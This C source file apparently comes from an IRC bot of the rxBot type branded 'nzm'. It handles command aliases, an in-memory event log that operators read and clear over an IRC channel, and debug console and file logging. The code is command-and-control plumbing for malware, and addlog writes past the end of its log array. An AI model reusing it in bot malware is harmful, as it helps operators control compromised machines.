#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

// globals
#ifdef DEBUG_LOGGING
FILE *gfp;
#endif

char log[LOGSIZE][LOGLINE];

int addalias(char *name, char *command)
{
	int i;
	for (i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
}

void aliaslist(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "-[Alias List]-", notice);
	for (int i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] != '\0') {
			_snprintf(buffer, sizeof(buffer),"%d. %s = %s", i, aliases[i].name, aliases[i].command);
			irc_privmsg(sock, chan, buffer, notice,TRUE);
		}
	}

	return;
}

void addlog(char *desc)
{
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (register int i = LOGSIZE; i >= 0; i--)
		if (log[i][0] != '\0')
			strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	_snprintf(log[0], sizeof(log[0]), "[%.2d-%.2d-%4d %.2d:%.2d:%.2d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);

	return;
}

void addlogv(char *desc, ...)
{
	char logbuf[LOGLINE];

	va_list argp;
	va_start(argp, desc);
	_vsnprintf(logbuf, sizeof(logbuf), desc, argp);

	addlog(logbuf);

	return;
}

void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter)
{
	int entries = LOGSIZE, tmp = 0;

	if (!silent) irc_privmsg(sock, chan, "-[Logs]-", notice);

	if (filter) {
		if ((tmp = atoi(filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++)
		if (log[i][0] != '\0') {
			if (!filter || tmp != 0)
				irc_privmsg(sock, chan, log[i], notice, TRUE);
			else if (lstrstr(log[i], filter))
				irc_privmsg(sock, chan, log[i], notice, TRUE);
		}

	return;
}

void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	for (register int i = 0;i < LOGSIZE; log[i++][0] = '\0');
	if (!silent) irc_privmsg(sock, chan, "nzm (logs.plg) »»   Cleared.", notice);
	addlog("nzm (logs.plg) »»   Cleared.");

	return;
}

BOOL searchlog(char *filter)
{
	for (int i = 0; i < LOGSIZE; i++)
		if (log[i][0] != '\0') {
			if (lstrstr(log[i], filter))
				return TRUE;
		}

	return FALSE;
}

DWORD WINAPI ShowLogThread(LPVOID param)
{
	char sendbuf[IRCLINE];
	int entries = LOGSIZE, tmp = 0;

	SHOWLOG showlog = *((SHOWLOG *)param);
	SHOWLOG *showlogp = (SHOWLOG *)param;
	showlogp->gotinfo = TRUE;

	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,"nzm (log.plg) »»  Begin",showlog.notice);

	if (showlog.filter[0] != '\0') {
		if ((tmp = atoi(showlog.filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++)
		if (log[i][0] != '\0') {
			if (showlog.filter[0] == '\0' || tmp != 0)
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
			else if (lstrstr(log[i], showlog.filter))
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
		}

	sprintf(sendbuf,"nzm (log.plg) »»  List complete.");
	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,sendbuf,showlog.notice);
	addlog(sendbuf);

	clearthread(showlog.threadnum);

	ExitThread(0);
}

#ifdef DEBUG_LOGGING
void opendebuglog(void)
{
	gfp = fopen(logfile, "ab");

	return;
}

void debuglog(char *buffer, BOOL crlf)
{
	if (gfp != NULL) {
		if (crlf)
			fprintf(gfp,"%s\r\n",buffer);
		else
			fprintf(gfp,"%s",buffer);
		fflush(gfp);
	}

	return;
}

void closedebuglog(void)
{
	fclose(gfp);

	return;
}
#endif

#ifdef DEBUG_CONSOLE
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	switch(dwCtrlType) {
	case CTRL_C_EVENT:
	case CTRL_BREAK_EVENT:
	case CTRL_CLOSE_EVENT:
		return TRUE;
	}

	return FALSE;
}

void OpenConsole(void)
{
	AllocConsole();

	int hCrt = _open_osfhandle((long)GetStdHandle(STD_OUTPUT_HANDLE),_O_TEXT);
	FILE *hf = _fdopen(hCrt,"w");
	*stdout = *hf;
	int i = setvbuf(stdout,NULL,_IONBF,0);

	hCrt = _open_osfhandle((long)GetStdHandle(STD_ERROR_HANDLE),_O_TEXT);
	hf = _fdopen(hCrt,"w");
	*stderr = *hf;
	i = setvbuf(stdout,NULL,_IONBF,0);

	SetConsoleCtrlHandler(HandlerRoutine, true);

	return;
}
#endif